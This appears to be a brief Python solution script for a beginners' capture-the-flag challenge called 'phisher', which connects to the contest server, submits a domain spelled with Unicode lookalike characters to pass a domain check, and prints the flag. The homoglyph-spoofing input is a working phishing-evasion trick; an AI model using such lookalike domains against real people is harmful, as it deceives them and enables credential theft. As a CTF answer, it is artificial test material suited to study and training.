import re
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("phisher.quals.beginners.seccon.jp", 44322))

s.recv(2**10) # FQDN:
s.send("ωωω․ė×аⅿρIε․εοⅿ\n".encode())
flag = re.search("ctf4b{.*?}", s.recv(2**10).decode()).group()
print(flag)

s.close()